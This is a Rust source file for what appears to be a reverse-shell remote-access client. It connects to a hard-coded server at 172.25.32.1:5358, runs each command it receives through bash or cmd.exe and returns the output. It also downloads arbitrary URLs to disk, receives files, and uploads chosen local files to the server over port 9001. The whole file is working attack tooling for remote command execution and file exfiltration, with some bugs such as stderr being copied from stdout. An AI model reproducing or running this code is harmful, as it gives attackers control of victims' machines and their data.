use std::net::{Ipv4Addr,SocketAddrV4,TcpListener,TcpStream,Shutdown};
use std::process::{Command,exit};
use std::io::{self, Write, BufReader, BufRead};
use std::process::Output;

fn executecmd(cmd:&str) -> String{
    let client_os: (&str, String);
    client_os = if cfg!(target_os = "windows") {
        ("cmd.exe", "/c ".to_owned())
    } else {
        ("/bin/bash", "-c ".to_owned())
    };
    let (base, temp) = client_os;
    let fullcmd =  temp + cmd;
    let cmds: Vec<&str> = fullcmd.split(" ").collect();
    let extra_args: bool = if cmds.len() > 1 {
        true
    } else {
        false
    };

    let change_dir: bool = if extra_args {
        cmds[1] == "cd"
    } else {
        false
    };

    let mut stdout = String::new();
    let mut stderr = String::new();
    if change_dir {
        let dir = cmds[2].to_string();
        if std::env::set_current_dir(dir.trim()).is_ok() {
            let success = "New directory:";
            stdout = [success, &dir].join(" ");
            
        } else {
            stderr = "Could not change directory".to_owned();
        }
    } else {
        let res: Output = Command::new(base).args(&cmds).output().unwrap();
        stdout = String::from_utf8_lossy(res.stdout.as_slice()).to_string();
        stderr = String::from_utf8_lossy(res.stdout.as_slice()).to_string();
    }
    if stdout.len()>0{
        return stdout;
    }
    else{
        return stderr;
    }
}

use std::io::{Read};
use std::path::Path;
fn handle_client_tx(mut stream: TcpStream){
    let mut filename = [0; 128];
    let bytes_read = stream.read(&mut filename).unwrap();
    let original_filename = std::str::from_utf8(&filename[..bytes_read]).unwrap().trim();
    println!("Received file {}", original_filename);
    let mut newfilname = String::from(original_filename);println!("File {}", newfilname);
    let mut file = std::fs::File::create(original_filename).unwrap();
    let mut buffer = [0; 1024];
    loop {
        let bytes_read = stream.read(&mut buffer).unwrap();
        if bytes_read == 0 {
            break;
        }
        let data = &buffer[..bytes_read];
        file.write_all(data).unwrap();
    }
    println!("Saved file {}", original_filename);
}

 fn clienttx(filenm: String, serveraddresstx: String) {
    println!("inside loop");
    let mut listener = TcpListener::bind(serveraddresstx.clone()).unwrap();
    println!("sver check: {}", serveraddresstx);
    println!("Binded");
    for stream in listener.incoming() {
        println!("in Stream");
        match stream {
            Ok(stream) => { println!("in Stream");
                std::thread::spawn(|| {
                    println!("handling client fcn");
                    handle_client_tx(stream);
                });  return drop(listener);
            }
            Err(e) => {
                println!("Error: {}", e);
            }
        }
    }
    drop(listener);
}

use std::fs;
use std::io::prelude::*;
fn send_to_server(socket:&mut TcpStream, filename: & str) -> std::io::Result<()> {
    let file_path = Path::new(filename);
    let mut file = File::open(&file_path)?;
    let mut contents = Vec::new();
    file.read_to_end(&mut contents);
    let mut socket = socket;

    // Send file name
    let filename = file_path.file_name().unwrap().to_str().unwrap();
    let filename_bytes = filename.as_bytes();
    let filename_len = filename_bytes.len();
    socket.write_all(&filename_bytes)?;

    println!(
        "Sent filenm with {:?} bytes and contents: {}",
        filename_bytes,
        String::from_utf8_lossy(&filename_bytes)
    );

    // Send file contents
    let contents_len = contents.len();
    socket.write_all(&contents)?;

    println!(
        "Sent file with {} bytes and contents: {}",
        contents_len,
        String::from_utf8_lossy(&contents)
    );
    Ok(())
}

use std::cmp::min;
use std::fs::{File, OpenOptions};
use std::io::{Seek};
use reqwest::Client;
use indicatif::{ProgressBar, ProgressStyle};
use futures_util::StreamExt;

pub async fn download_file(client: &Client, url: &str, path: &str) -> Result<(), String> {
    let res = client
        .get(url)
        .send()
        .await
        .or(Err(format!("Failed to GET from '{}'", &url)))?;
    let total_size = res
        .content_length()
        .ok_or(format!("Failed to get content length from '{}'", &url))?;

    let pb = ProgressBar::new(total_size);
    pb.set_style(ProgressStyle::default_bar()
        .template("{msg}\n{spinner:.green} [{elapsed_precise}] [{wide_bar:.white/blue}] {bytes}/{total_bytes} ({bytes_per_sec}, {eta})")
        .progress_chars("█  "));
    pb.set_message(&format!("Downloading {}", url));

    let mut file;
    let mut downloaded: u64 = 0;
    let mut stream = res.bytes_stream();
    
    println!("Seeking in file.");
    if std::path::Path::new(path).exists() {
        println!("File exists. Resuming.");
        file = std::fs::OpenOptions::new()
            .read(true)
            .append(true)
            .open(path)
            .unwrap();

        let file_size = std::fs::metadata(path).unwrap().len();
        file.seek(std::io::SeekFrom::Start(file_size)).unwrap();
        downloaded = file_size;

    } else {
        println!("Fresh file..");
        file = File::create(path).or(Err(format!("Failed to create file '{}'", path)))?;
    }

    println!("Commencing transfer");
    while let Some(item) = stream.next().await {
        let chunk = item.or(Err(format!("Error while downloading file")))?;
        file.write(&chunk)
            .or(Err(format!("Error while writing to file")))?;
        let new = min(downloaded + (chunk.len() as u64), total_size);
        downloaded = new;
        pb.set_position(new);
    }
    pb.finish_with_message(&format!("Downloaded {} to {}", url, path));
    return Ok(());
}

#[tokio::main]
async fn main() {
    // set ip address and port here
    let mut ipaddy = "172.25.32.1".to_string();
    let port = "5358".to_string();
    let port2 = "9001".to_string(); // for tx and rx of files
    
    let serveraddress = format!("{}:{}",ipaddy,port);
    let serveraddresstx = format!("{}:{}",ipaddy,port2);
    let mut client =TcpStream::connect(serveraddress).unwrap();
    println!("Connected to: {}", client.peer_addr().unwrap());

    loop{
        let mut buffer:Vec<u8> = Vec::new();
        let mut reader = BufReader::new(&client);
        reader.read_until(b'\0', &mut buffer);
        println!("reciever from server: {}", String::from_utf8_lossy(&buffer).trim());
        let text : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
        if buffer.len()==0 ||
        &text=="quit"{
            println!("break");
            break;
        }

        if &text=="dl"{
            let mut buffer:Vec<u8> = Vec::new();
            let mut reader = BufReader::new(&client);
            reader.read_until(b'\0', &mut buffer);
            println!("reciever from server in dl 1: {}", String::from_utf8_lossy(&buffer).trim());
            let urltext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
            println!("ooutput dl url capture check: {}", urltext);
            let mut buffer:Vec<u8> = Vec::new();
            let mut reader = BufReader::new(&client);
            reader.read_until(b'\0', &mut buffer);
            println!("reciever from server in dl mode: {}", String::from_utf8_lossy(&buffer).trim()); // dl input capture
            let fntext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
            //println!("ooutput dl fn capture check: {}", fntext);
            println!("downloading files...");
            download_file(&Client::new(), &urltext, &fntext).await.unwrap();
            println!("Files downloaded...");
        }

        if &text=="tx"{ //downloading from server 
            let mut buffer:Vec<u8> = Vec::new();
            let mut reader = BufReader::new(&client);
            reader.read_until(b'\0', &mut buffer);
            println!("reciever file downloading: {}", String::from_utf8_lossy(&buffer).trim());
            let urltext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
            let mut buffer:Vec<u8> = Vec::new();
            let mut reader = BufReader::new(&client);
            let fntext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
            println!("recieving files...");
            clienttx(fntext, serveraddresstx.clone());
            println!("Files downloaded...");
        }

        if &text=="rx"{ //uploading to server 
            let mut buffer:Vec<u8> = Vec::new();
            let mut reader = BufReader::new(&client);
            reader.read_until(b'\0', &mut buffer);
            println!("reciever from server in tx 1: {}", String::from_utf8_lossy(&buffer).trim());
            let fntext : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
            let mut buffer:Vec<u8> = Vec::new();
            let mut reader = BufReader::new(&client);
            //reader.read_until(b'\0', &mut buffer);
            println!("reciever from server in rx mode: {}", String::from_utf8_lossy(&buffer).trim()); // dl input capture
            let fnpath : String = String::from_utf8_lossy(&buffer).trim_end_matches('\0').replace('\n', "").replace('\r', "");
            println!("sending files...");
            send_to_server(&mut TcpStream::connect(serveraddresstx.to_string()).unwrap(), &fntext);
            println!("sent to server...");
        }
        
        let mut output =executecmd(String::from_utf8_lossy(&buffer).trim_end_matches('\0'));
        output.push('\0');
        client.write(&mut output.as_bytes());
    }
    client.shutdown(Shutdown::Both);
}
